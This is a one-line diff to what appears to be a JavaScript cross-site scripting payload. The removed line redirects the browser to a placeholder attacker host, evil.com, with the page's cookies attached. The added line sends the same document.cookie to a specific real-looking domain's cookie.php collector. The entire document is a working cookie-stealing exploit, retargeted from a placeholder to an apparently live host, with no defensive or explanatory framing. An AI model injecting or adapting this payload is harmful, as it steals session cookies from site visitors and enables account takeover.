@@ -1,1 +1,1 @@
-document.location="http://www.evil.com/cookie.asp?cookie="+document.cookie;
+document.location="http://www.xiaotian.website/cookie.php?cookie="+document.cookie;
